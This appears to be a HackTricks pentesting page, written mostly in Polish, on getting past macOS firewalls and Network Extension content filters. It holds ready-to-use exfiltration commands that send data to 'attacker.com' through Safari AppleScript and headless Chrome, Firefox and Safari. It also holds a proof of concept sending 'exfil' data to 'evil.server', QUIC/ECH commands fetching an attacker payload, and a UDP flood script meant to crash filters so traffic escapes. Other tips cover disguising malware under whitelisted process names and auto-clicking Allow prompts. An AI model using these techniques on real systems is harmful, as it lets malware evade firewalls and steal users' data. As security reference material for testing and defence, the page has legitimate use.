# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Znalezione techniki

Poniższe techniki działały w niektórych aplikacjach firewall na macOS.

### Abusing whitelist names

- Na przykład uruchamiając malware pod nazwami dobrze znanych procesów macOS, takimi jak **`launchd`**

### Synthetic Click

- Jeśli firewall poprosi użytkownika o zgodę, spraw, by malware **kliknęło Allow**

### **Use Apple signed binaries**

- Na przykład **`curl`**, ale także inne, jak **`whois`**

### Well known apple domains

Firewall może zezwalać na połączenia z dobrze znanymi domenami Apple, takimi jak **`apple.com`** czy **`icloud.com`**. iCloud może być używany jako C2.

### Generic Bypass

Kilka pomysłów na próby obejścia firewalli

### Check allowed traffic

Znajomość dozwolonego ruchu pomoże zidentyfikować potencjalnie whitelisted domeny lub które aplikacje mają do nich dostęp
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Wykorzystywanie DNS

Rozwiązywanie DNS odbywa się za pomocą podpisanej aplikacji **`mdnsreponder`**, która prawdopodobnie będzie miała uprawnienia do kontaktu z serwerami DNS.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Poprzez aplikacje przeglądarkowe

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Poprzez process injections

Jeśli możesz **inject code into a process**, który może łączyć się z dowolnym serwerem, możesz obejść firewall protections:

{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Najnowsze macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
W lipcu 2024 Apple załatał krytyczny błąd w Safari/WebKit, który złamał systemowy „Web content filter” używany przez Screen Time do kontroli rodzicielskiej.
Specjalnie spreparowany URI (na przykład z podwójnie zakodowanym URL „://”) nie jest rozpoznawany przez Screen Time ACL, ale jest akceptowany przez WebKit, więc żądanie jest wysyłane bez filtrowania. Każdy process that can open a URL (including sandboxed or unsigned code) może w związku z tym uzyskać dostęp do domen, które są jawnie zablokowane przez użytkownika lub profil MDM.

Test praktyczny (niezałatany system):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Błąd kolejności reguł Packet Filter (PF) we wczesnych wersjach macOS 14 “Sonoma”
Podczas cyklu beta macOS 14 Apple wprowadziło regresję w wrapperze w przestrzeni użytkownika wokół **`pfctl`**.
Reguły dodane za pomocą słowa kluczowego `quick` (używanego przez wiele VPN kill-switches) były cicho ignorowane, powodując leak ruchu nawet gdy VPN/firewall GUI raportowało *blocked*. Błąd został potwierdzony przez kilku dostawców VPN i naprawiony w RC 2 (build 23A344).

Szybkie sprawdzenie leak:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Wykorzystywanie usług pomocniczych podpisanych przez Apple (legacy – pre-macOS 11.2)
Przed macOS 11.2 **`ContentFilterExclusionList`** pozwalał ~50 binariom Apple, takim jak **`nsurlsessiond`** i App Store, na obejście wszystkich socket-filter firewalls implemented with the Network Extension framework (LuLu, Little Snitch, etc.). Malware mógł po prostu uruchomić wykluczony proces — lub wstrzyknąć w niego kod — i tunnelować własny traffic przez już dozwolony socket. Apple całkowicie usunął listę wykluczeń w macOS 11.2, ale technika wciąż jest istotna na systemach, których nie można zaktualizować.

Przykład proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH aby ominąć filtry domen Network Extension (macOS 12+)
NEFilter Packet/Data Providers opierają się na TLS ClientHello SNI/ALPN. Dzięki **HTTP/3 over QUIC (UDP/443)** i **Encrypted Client Hello (ECH)** SNI pozostaje zaszyfrowane, NetExt nie może parsować ruchu, a reguły nazw hostów często fail-open, pozwalając malware dotrzeć do zablokowanych domen bez ingerencji w DNS.

Minimalny PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Jeśli QUIC/ECH jest nadal włączony, to jest to łatwa ścieżka obejścia hostname-filter.

### Niestabilność Network Extension w macOS 15 “Sequoia” (2024–2025)
Wczesne buildy 15.0/15.1 powodują awarię filtrów firm trzecich **Network Extension** (LuLu, Little Snitch, Defender, SentinelOne, etc.). Gdy filtr się restartuje, macOS usuwa swoje flow rules i wiele produktów przechodzi w tryb fail‑open. Zalewanie filtra tysiącami krótkich przepływów UDP (lub wymuszanie QUIC/ECH) może wielokrotnie wywołać awarię i pozostawić okno dla C2/exfil, podczas gdy GUI nadal twierdzi, że firewall działa.

Szybkie odtworzenie (bezpieczne środowisko laboratoryjne):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Wskazówki narzędziowe dla nowoczesnego macOS

1. Sprawdź bieżące reguły PF, które generują GUI firewalle:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Wypisz binarki, które już posiadają uprawnienie *outgoing-network* (przydatne do piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Programowo zarejestruj własny Network Extension content filter w Objective-C/Swift.
Minimalny rootless PoC, który przekazuje pakiety do lokalnego socketu, jest dostępny w kodzie źródłowym Patrick Wardle’a **LuLu**.

## Źródła

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
- <https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/>
- <https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos>

{{#include ../../banners/hacktricks-training.md}}
